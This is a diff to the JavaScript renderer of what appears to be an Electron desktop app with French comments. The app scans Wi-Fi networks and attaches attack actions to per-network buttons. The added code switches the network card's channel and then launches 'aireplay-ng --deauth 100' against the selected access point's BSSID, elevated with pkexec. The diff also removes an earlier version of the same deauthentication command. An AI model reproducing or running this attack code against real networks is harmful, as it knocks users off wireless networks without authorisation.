@@ -1,5 +1,7 @@
 let networkslist = []; // Déclaration d'une variable globale pour stocker les réseaux Wi-Fi
 
+const config = window.materialapi.config
+
 // renderer.js (gère le clic sur le bouton)
 window.addEventListener('DOMContentLoaded', () => {
     const buttonwifi = document.getElementById('validatebuttonwifi');
@@ -63,8 +65,6 @@ window.addEventListener('DOMContentLoaded', () => {
             if (network) {
                 // Loguer les informations du réseau trouvé
                 window.appapi.logreport(`Réseau selectioné pour éxécuter la commande aircrack\n : ${JSON.stringify(network, null, 2)}`);
-                const command = `aireplay-ng --deauth 100 -a ${bssid} wlan0mon`;
-                window.materialapi.aircrackattack(command);
             } else {
                 window.appapi.logreport(`Réseau non trouvé pour le BSSID: ${bssid}`);
             }
@@ -84,7 +84,13 @@ window.addEventListener('DOMContentLoaded', () => {
             // Ajoute un événement de clic pour chaque bouton wifi
             button.addEventListener('click', () => {
                 window.appapi.logreport(`Clic sur le bouton wifi avec BSSID: ${networkslist.bssid}`);
-                // Fait quelque chose avec le BSSID du réseau wifi sélectionné
+                // D'abord changer le canal
+                const channelCommand = `pkexec iwconfig ${config.networkcard} channel ${networkslist.channel}`;
+                window.materialapi.aircrackattack(channelCommand);
+                //erreur ce lance en paralle
+                // Puis lancer l'attaque
+                const attackCommand = `pkexec aireplay-ng --deauth 100 -a ${networkslist.bssid} ${config.networkcard}`;
+                window.materialapi.aircrackattack(attackCommand);
             });
         });
       };
